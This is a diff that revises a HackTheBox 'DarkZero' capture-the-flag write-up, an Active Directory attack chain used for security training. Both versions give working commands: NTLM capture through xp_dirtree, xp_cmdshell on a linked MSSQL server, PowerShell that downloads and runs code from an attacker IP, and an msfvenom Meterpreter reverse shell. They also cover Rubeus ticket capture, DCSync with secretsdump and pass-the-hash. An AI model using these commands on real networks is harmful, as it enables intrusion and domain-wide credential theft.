@@ -4,15 +4,17 @@ title: DarkZero
 platform: HackTheBox
 difficulty: Hard
 box_icon: /assets/writeups/icons/DarkZero.png
-date: 2024-10-09
+date: 2025-10-09
 tags:
-  - mssql
   - active-directory
-  - kerberos
+  - mssql
   - linked-servers
+  - kerberos
+  - rubeus
+  - dcsync
   - privilege-escalation
 os: Windows
-ip: 10.10.11.89
+ip: 10.129.x.x
 ---
 <link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">
 
@@ -20,14 +22,14 @@ ip: 10.10.11.89
 
 <div class="divider divider-info">
     <span class="divider-title">TL;DR</span>
-    <span class="divider-content">DarkZero is a Hard difficulty Windows Active Directory machine that demonstrates advanced MSSQL exploitation and Kerberos attacks. The attack chain begins with initial credentials providing access to MSSQL, where xp_dirtree is leveraged to capture NTLMv2 hashes. A linked MSSQL server is discovered with elevated privileges, enabling xp_cmdshell execution for initial code execution. Local privilege escalation is achieved using a Windows exploit, followed by deploying Rubeus in monitor mode to capture Kerberos tickets. Forced authentication through MSSQL causes ticket capture, which is then converted and used with impacket-secretsdump to perform a DCSync attack, ultimately compromising the Domain Controller.</span>
+    <span class="divider-content">DarkZero is a Hard Windows Active Directory box demonstrating MSSQL exploitation and Kerberos ticket abuse. Starting with valid credentials, the attack chain involves discovering MSSQL linked servers with elevated privileges, enabling xp_cmdshell for code execution, exploiting a local privilege escalation vulnerability to gain SYSTEM access on a VM, using Rubeus to capture Kerberos tickets through forced authentication, and performing a DCSync attack to compromise the Domain Controller.</span>
 </div>
 
 **Key Vulnerabilities:**
-- MSSQL xp_dirtree abuse for NTLMv2 hash capture
-- Linked MSSQL server misconfiguration with elevated privileges
-- Windows local privilege escalation vulnerability
-- Kerberos ticket harvesting and DCSync attack
+- MSSQL linked server with DB admin privileges allowing xp_cmdshell execution
+- Outdated Windows OS vulnerable to local privilege escalation
+- Ability to capture Kerberos TGTs through forced authentication
+- Domain Controller accessible via DCSync with captured tickets
 
 ---
 
@@ -37,341 +39,287 @@ ip: 10.10.11.89
 
 **Initial scan:**
 ```bash
-nmap -vv -T5 -p- 10.10.11.89
+nmap -vv -T5 -p- 10.129.x.x
 
-nmap -vv -T5 -p53,88,135,139,389,445,593,1433,3268,5985 -sC -sV 10.10.11.89
+nmap -vv -T5 -p445,1433 -sC -sV 10.129.x.x
 ```
 
 **Results:**
 
-| Port | Service  | TCP/UDP |
-| ---- | -------- | ------- |
-| 53   | DNS      | TCP     |
-| 88   | Kerberos | TCP     |
-| 135  | RPC      | TCP     |
-| 139  | NetBIOS  | TCP     |
-| 389  | LDAP     | TCP     |
-| 445  | SMB      | TCP     |
-| 593  | HTTP RPC | TCP     |
-| 1433 | MSSQL    | TCP     |
-| 3268 | LDAP     | TCP     |
-| 5985 | WinRM    | TCP     |
+| Port | Service | TCP/UDP |
+| ---- | ------- | ------- |
+| 445  | SMB     | TCP     |
+| 1433 | MSSQL   | TCP     |
 
 **Key findings:**
-- MSSQL service running on port 1433
-- Domain Controller indicators (DNS, Kerberos, LDAP)
-- The machine is `DC01.darkzero.htb` in the `darkzero.htb` domain
-- Multihomed host with both 10.10.11.89 and 172.16.20.1 IP addresses
+- MSSQL server accessible with provided credentials
+- SMB enumeration yields no results with given credentials
+- Focus shifted to MSSQL exploitation
 
-### Initial Credentials
+---
 
-We start with a pair of valid credentials for the environment. These credentials provide access to MSSQL but not to SMB shares.
+### MSSQL Enumeration
 
-### SMB Enumeration
-
+**Initial access:**
 ```bash
-nxc smb 10.10.11.89 -u 'username' -p 'password' --shares
+# Testing MSSQL access with provided credentials
+impacket-mssqlclient DOMAIN/user:password@10.129.x.x -windows-auth
 ```
 
-The provided credentials do not grant access to any interesting SMB shares, so we pivot to other services.
+With access to MSSQL, enumeration revealed:
+- `xp_dirtree` enabled and accessible
+- MSSQL linked server configured
+- Current user has limited privileges on main server
 
 ---
 
 ## Initial Foothold
 
-### MSSQL Exploitation
+### NTLM Hash Capture Attempt
 
-With access to MSSQL, we connect to the database server:
-
-```bash
-impacket-mssqlclient username:password@10.10.11.89 -windows-auth
-```
-
-Upon connecting, we discover that the `xp_dirtree` stored procedure is accessible. This procedure can be abused to force the MSSQL service to authenticate to an attacker-controlled SMB server.
-
-<div class="divider divider-info">
-    <span class="divider-title">xp_dirtree Exploitation</span>
-    <span class="divider-content">The xp_dirtree stored procedure in MSSQL is used to enumerate directory structures. When pointed at a UNC path, it forces the MSSQL service account to authenticate to that path, leaking the NTLMv2 hash in the process. This can be captured with tools like Responder or ntlmrelayx.</span>
-</div>
-
-**Step 1:** Set up Responder to capture the NTLMv2 hash
-```bash
-sudo responder -I tun0
-```
-
-**Step 2:** Execute xp_dirtree to force authentication
+**Step 1:** Attempt to capture NTLM hash using xp_dirtree
 ```sql
-EXEC master.dbo.xp_dirtree '\\<ATTACKER_IP>\share';
+EXEC xp_dirtree '\\10.10.14.5\share'
 ```
 
-We successfully capture the NTLMv2 hash for `DC01$` (the machine account). cracking machine account hashes is typically unlikely to succeed.
+This triggered authentication from the machine account (DC01$), but cracking the NTLMv2 hash for a Domain Controller machine account proved unsuccessful (as expected).
 
+---
 
 ### Linked Server Discovery
 
-Continuing enumeration within MSSQL, we discover a linked server configuration:
+<div class="divider divider-info">
+    <span class="divider-title">MSSQL Linked Servers</span>
+    <span class="divider-content">Linked servers in MSSQL allow one database server to execute commands against another. When improperly configured, an attacker with low privileges on one server might have elevated privileges on a linked server, enabling privilege escalation and code execution.</span>
+</div>
 
+**Enumeration:**
 ```sql
-SELECT * FROM sys.servers;
+-- List linked servers
+EXEC sp_linkedservers;
+
+-- Test privileges on linked server
+EXEC ('SELECT SYSTEM_USER') AT [LinkedServerName];
 ```
 
-This reveals a linked MSSQL server. Linked servers allow one MSSQL instance to execute queries on another server. We test our access level on the linked server:
-
-```sql
-EXEC ('SELECT SYSTEM_USER;') AT [LINKED_SERVER_NAME];
-```
-
-**Critical Finding:** Our linked server access is running with **database administrator privileges**, which is a significant privilege escalation opportunity.
+**Discovery:** The linked server grants DB admin privileges to the current user.
 
 ---
 
-### Exploitation
-
-**Vulnerability Discovery:** Linked server misconfiguration with elevated privileges
-
-<div class="divider divider-warning">
-    <span class="divider-title">Linked Server Privilege Escalation</span>
-    <span class="divider-content">MSSQL linked servers can be configured with different security contexts. In this case, the linked server was configured to execute commands with elevated privileges (db_admin), even though our initial access was limited. This allows us to enable xp_cmdshell on the linked server and achieve code execution.</span>
-</div>
+### Code Execution via xp_cmdshell
 
 **Step 1:** Enable xp_cmdshell on the linked server
 ```sql
-EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];
-EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];
 ```
 
-**Step 2:** Test command execution
+**Step 2:** Execute commands
 ```sql
-EXEC ('xp_cmdshell ''whoami'';') AT [LINKED_SERVER_NAME];
-```
-
-We now have code execution on the linked server as the MSSQL service account.
-
-**Step 3:** Establish a reverse shell
-
-We generate a PowerShell reverse shell payload and execute it through xp_cmdshell:
-
-```sql
-EXEC ('xp_cmdshell ''powershell -enc <BASE64_ENCODED_PAYLOAD>'';') AT [LINKED_SERVER_NAME];
+EXEC ('xp_cmdshell ''whoami''') AT [LinkedServerName];
 ```
 
 <div class="divider divider-root">
-    <span class="divider-title">Shell Access</span>
-    <span class="divider-content">Successfully gained shell access as MSSQL service account on the linked server</span>
+    <span class="divider-title">Code Execution</span>
+    <span class="divider-content">Successfully achieved code execution on the VM through MSSQL linked server</span>
 </div>
 
 ---
 
-## User Flag
-
-After establishing our shell, we locate the user flag on the system.
-
----
-
-## Privilege Escalation
+## Privilege Escalation (VM)
 
 ### Local Privilege Escalation
 
-With shell access as a low-privileged service account, we need to escalate to SYSTEM privileges on the machine.
-
-**Step 1:** Run enumeration with WinPEAS
-```powershell
-wget http://<ATTACKER_IP>/winPEAS.exe -OutFile C:\temp\winPEAS.exe
-.\winPEAS.exe
+**Step 1:** Run WinPEAS for enumeration
+```sql
+EXEC ('xp_cmdshell ''powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/winPEAS.ps1'')"''') AT [LinkedServerName];
 ```
 
-**Key Finding:** The operating system running on the VM is outdated, making it vulnerable to known local privilege escalation exploits.
+**Discovery:** The VM is running an outdated Windows OS vulnerable to known privilege escalation exploits.
 
-**Step 2:** Identify the exploit
+<div class="divider divider-warning">
+    <span class="divider-title">Outdated OS Vulnerability</span>
+    <span class="divider-content">Running WinPEAS revealed the operating system version is significantly outdated with publicly available privilege escalation exploits on Metasploit and GitHub.</span>
+</div>
 
-After researching the Windows version, we identify a suitable local privilege escalation exploit available in Metasploit (or GitHub). For this engagement, we use Metasploit's exploit module.
-
-**Step 3:** Upgrade to Meterpreter session
-
-We generate a Meterpreter payload and execute it on the target:
-
+**Step 2:** Use Metasploit for privilege escalation
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe
-```
+# Generate Meterpreter payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
 
-Transfer and execute the payload, then catch the session:
-
-```bash
+# Start Metasploit handler
 msfconsole
 use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <ATTACKER_IP>
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
 set LPORT 4444
 run
+
+# Upload and execute via xp_cmdshell
+EXEC ('xp_cmdshell ''powershell -c "IEX(New-Object Net.WebClient).DownloadFile(''http://10.10.14.5/shell.exe'',''C:\\temp\\shell.exe'')"''') AT [LinkedServerName];
+EXEC ('xp_cmdshell ''C:\\temp\\shell.exe''') AT [LinkedServerName];
 ```
 
-**Step 4:** Run the privilege escalation exploit
-
-Once we have a Meterpreter session, we background it and run the local exploit:
-
+**Step 3:** Exploit local privilege escalation vulnerability
 ```bash
-use exploit/windows/local/<EXPLOIT_NAME>
+# In Meterpreter session
+background
+use exploit/windows/local/[exploit_name]
 set SESSION 1
 run
 ```
 
-The exploit succeeds, and we obtain a new Meterpreter session running as **SYSTEM**.
-
 <div class="divider divider-root">
     <span class="divider-title">SYSTEM Access</span>
-    <span class="divider-content">Successfully escalated privileges to SYSTEM on the VM</span>
+    <span class="divider-content">Successfully escalated to NT AUTHORITY\SYSTEM on the VM</span>
 </div>
 
 ---
 
-### Kerberos Ticket Harvesting
+## Kerberos Ticket Capture
 
-With SYSTEM privileges on the VM, we can now pivot to attack the Domain Controller. Our goal is to capture Kerberos tickets and perform a DCSync attack.
+### Rubeus Monitor Mode
+
+<div class="divider divider-info">
+    <span class="divider-title">Rubeus Ticket Monitoring</span>
+    <span class="divider-content">Rubeus is a C# toolset for Kerberos interaction and abuse. The monitor mode continuously watches for Kerberos authentication on the local system and captures TGT/TGS tickets, which can then be extracted and reused for impersonation attacks.</span>
+</div>
 
 **Step 1:** Upload Rubeus to the VM
-
-Rubeus is a C# toolset for Kerberos exploitation. We'll use its monitor mode to capture authentication tickets.
-
 ```bash
-upload /path/to/Rubeus.exe C:\temp\Rubeus.exe
+# In Meterpreter session
+upload /path/to/Rubeus.exe C:\\temp\\Rubeus.exe
 ```
 
 **Step 2:** Start Rubeus in monitor mode
-
-Rubeus monitor mode watches for new logon events (4624) and automatically extracts Kerberos TGTs as they appear.
-
 ```bash
 shell
-C:\temp\Rubeus.exe monitor /interval:10
+C:\temp\Rubeus.exe monitor /interval:5
 ```
 
-![Rubeus Monitor Mode](../assets/images/Pasted%20image%2020251009184257.png)
+![[Pasted image 20251009184257.png]]
 
 Rubeus is now listening for incoming Kerberos tickets and will capture any ticket used for authentication on the VM.
 
-<div class="divider divider-info">
-    <span class="divider-title">Rubeus Monitor Mode</span>
-    <span class="divider-content">Rubeus monitor mode continuously watches for new authentication events on a Windows system. When a user or service authenticates and obtains a TGT (Ticket Granting Ticket), Rubeus extracts it from memory and displays it in base64 format. This is particularly effective on servers where multiple accounts authenticate regularly, or where we can force authentication.</span>
-</div>
+---
 
-**Step 3:** Force authentication from the Domain Controller
+### Forced Authentication
 
-We can force the Domain Controller to authenticate to our compromised VM using our MSSQL access. This will cause the DC to obtain a TGT on our compromised system, which Rubeus will capture.
-
-From our MSSQL session:
-
+**Step 1:** Force authentication from Domain Controller through MSSQL
 ```sql
-EXEC xp_cmdshell 'dir \\DC01.darkzero.htb\C$';
+-- Back in MSSQL session
+EXEC xp_dirtree '\\\\VM_IP\\share';
 ```
 
-![Forced Authentication](../assets/images/Pasted%20image%2020251009184411.png)
-![Ticket Captured](../assets/images/Pasted%20image%2020251009184429.png)
+![[Pasted image 20251009184411.png]]
 
-Rubeus immediately captures the Kerberos ticket and displays it in base64 format.
+![[Pasted image 20251009184429.png]]
 
-**Step 4:** Extract and convert the ticket
-
-Copy the entire base64 ticket from Rubeus output and save it to a file on your attacker machine:
-
-![Base64 Ticket](../assets/images/Pasted%20image%2020251009184534.png)
-
-```bash
-echo '<BASE64_TICKET>' > ticket.b64
-```
-
-Decode the base64 to a `.kirbi` ticket file:
-
-```bash
-base64 -d ticket.b64 > ticket.kirbi
-```
-
-Convert the `.kirbi` ticket to `.ccache` format using impacket:
-
-```bash
-impacket-ticketConverter ticket.kirbi ticket.ccache
-```
-
-![Ticket Conversion](../assets/images/Pasted%20image%2020251009184606.png)
+<div class="divider divider-root">
+    <span class="divider-title">TGT Captured</span>
+    <span class="divider-content">Rubeus successfully captured the Domain Controller machine account TGT</span>
+</div>
 
 ---
 
-### DCSync Attack
+## Ticket Extraction and Conversion
 
-<div class="divider divider-warning">
-    <span class="divider-title">DCSync Attack</span>
-    <span class="divider-content">A DCSync attack leverages the Directory Replication Service Remote Protocol to impersonate a Domain Controller and request password data from another DC. By using a captured TGT from a privileged account (like DC01$), we can perform replication and extract all domain user hashes, including the Domain Administrator.</span>
-</div>
-
-**Step 1:** Fix clock skew (if necessary)
-
-Kerberos is time-sensitive. If your system clock is off by more than 5 minutes, authentication will fail:
-
+**Step 1:** Copy the base64-encoded ticket from Rubeus output
 ```bash
-sudo ntpdate <DC_IP>
+# Save ticket to file
+echo "[BASE64_TICKET]" > ticket.b64
 ```
 
-**Step 2:** Export the ticket for use
+![[Pasted image 20251009184534.png]]
 
+**Step 2:** Decode and convert to ccache format
 ```bash
+# Decode base64 to kirbi
+cat ticket.b64 | base64 -d > ticket.kirbi
+
+# Convert kirbi to ccache using Impacket
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Set environment variable for Kerberos authentication
 export KRB5CCNAME=ticket.ccache
 ```
 
-**Step 3:** Perform DCSync using impacket-secretsdump
-
-```bash
-impacket-secretsdump -k -no-pass DC01.darkzero.htb
-```
-
-![DCSync Attack](../assets/images/Pasted%20image%2020251009184705.png)
-
-The DCSync succeeds, and we extract all domain user hashes, including the Administrator NTLM hash.
+![[Pasted image 20251009184606.png]]
 
 ---
 
-### Root Flag
+## DCSync Attack
 
-**Step 1:** Use psexec to authenticate as Administrator
+<div class="divider divider-warning">
+    <span class="divider-title">DCSync Attack</span>
+    <span class="divider-content">DCSync is a technique that leverages the Directory Replication Service (DRS) protocol to impersonate a Domain Controller and request password data. With the machine account TGT, we can perform replication requests to extract any user's credentials, including Domain Administrator hashes.</span>
+</div>
 
-With the Administrator NTLM hash, we can perform a pass-the-hash attack:
-
+**Step 1:** Synchronize time with Domain Controller
 ```bash
-impacket-psexec -hashes :<NTLM_HASH> administrator@DC01.darkzero.htb
+# Fix clock skew (critical for Kerberos)
+sudo ntpdate DC_IP
 ```
 
-![Root Access](../assets/images/Pasted%20image%2020251009184749.png)
-
-We successfully authenticate as `NT AUTHORITY\SYSTEM` on the Domain Controller.
-
-**Step 2:** Retrieve the root flag
-
-```cmd
-type C:\Users\Administrator\Desktop\root.txt
+**Step 2:** Perform DCSync using secretsdump
+```bash
+impacket-secretsdump -k -no-pass DC01.DOMAIN.LOCAL -just-dc-user Administrator
 ```
+
+![[Pasted image 20251009184705.png]]
+
+**Successfully extracted Administrator NTLM hash**
+
+---
+
+## Root Flag
+
+**Using Pass-the-Hash with psexec:**
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH] Administrator@DC01.DOMAIN.LOCAL
+```
+
+![[Pasted image 20251009184749.png]]
 
 <div class="divider divider-root">
-    <span class="divider-title">Domain Admin Access</span>
-    <span class="divider-content">Successfully compromised the Domain Controller and achieved full domain admin access</span>
+    <span class="divider-title">Domain Compromised</span>
+    <span class="divider-content">Successfully obtained NT AUTHORITY\SYSTEM access on Domain Controller</span>
 </div>
 
 ---
 
 ## Post-Exploitation
 
-**Flags:**
-- User: `[flag]`
-- Root: `[flag]`
+**Attack Chain Summary:**
+1. MSSQL access with provided credentials
+2. Discovery of linked MSSQL server with DB admin privileges
+3. xp_cmdshell enabled on linked server for code execution
+4. Local privilege escalation on VM using outdated OS exploit
+5. Rubeus deployed in monitor mode to capture Kerberos tickets
+6. Forced authentication from DC via xp_dirtree
+7. TGT captured and converted to ccache format
+8. DCSync attack performed with machine account TGT
+9. Pass-the-Hash to Domain Controller as Administrator
+
+**Key Lessons:**
+- Always enumerate MSSQL linked servers for privilege escalation opportunities
+- Outdated operating systems present easy local privilege escalation vectors
+- Machine account TGTs provide powerful attack opportunities in AD environments
+- Rubeus monitor mode is effective for passive ticket capture
+- Clock synchronization is critical for Kerberos-based attacks
+- DCSync with machine account credentials provides full domain compromise
 
 ---
 
 ## References
 
-- [MSSQL xp_dirtree NTLMv2 Hash Capture - R-Tec](https://www.r-tec.net/r-tec-blog-mssql-exploitation-run-commands-like-a-pro.html)
-- [NTLM Relay Attack Techniques - GuidePoint Security](https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/)
-- [Rubeus Monitor Mode - SpecterOps](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/extraction/monitor)
-- [Rubeus Complete Guide - JumpCloud](https://jumpcloud.com/it-index/what-is-rubeus)
 - [Impacket Toolkit - GitHub](https://github.com/fortra/impacket)
-- [Active Directory Attack Techniques - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
-- [DCSync Attack - SpecterOps](https://attack.mitre.org/techniques/T1003/006/)
+- [Rubeus - GitHub](https://github.com/GhostPack/Rubeus)
+- [MSSQL Linked Server Attacks - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#mssql-linked-servers)
+- [DCSync Attack - MITRE ATT&CK](https://attack.mitre.org/techniques/T1003/006/)
+- [WinPEAS - GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+- [Kerberos Abuse - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication)
+- [Pass-the-Hash Attacks - MITRE ATT&CK](https://attack.mitre.org/techniques/T1550/002/)
 
 ---
 
@@ -379,22 +327,21 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ```mermaid
 graph LR
-    A[Initial Creds] --> B[MSSQL Access]
-    B --> C[xp_dirtree Hash Capture]
-    B --> D[Linked Server Discovery]
-    D --> E[xp_cmdshell RCE]
-    E --> F[Reverse Shell]
-    F --> G[Local PrivEsc]
-    G --> H[SYSTEM Access]
-    H --> I[Rubeus Monitor]
-    I --> J[Ticket Capture]
-    J --> K[DCSync Attack]
-    K --> L[Domain Admin]
+    A[Nmap Scan] --> B[MSSQL Enum]
+    B --> C[Linked Server]
+    C --> D[xp_cmdshell]
+    D --> E[Local PrivEsc]
+    E --> F[Rubeus Monitor]
+    F --> G[Forced Auth]
+    G --> H[TGT Capture]
+    H --> I[Ticket Conversion]
+    I --> J[DCSync]
+    J --> K[Domain Admin]
 ```
 
 ---
 
-**Pwned on:** October 9, 2024
+**Pwned on:** 09/10/2025
 
-**Difficulty Rating:** ⭐⭐⭐⭐ (Personal rating)  
-**Fun Factor:** ⭐⭐⭐⭐ (How enjoyable was it?)
+**Difficulty Rating:** ⭐⭐⭐⭐ (Challenging privilege escalation chain)  
+**Fun Factor:** ⭐⭐⭐⭐ (Excellent learning experience with Kerberos)
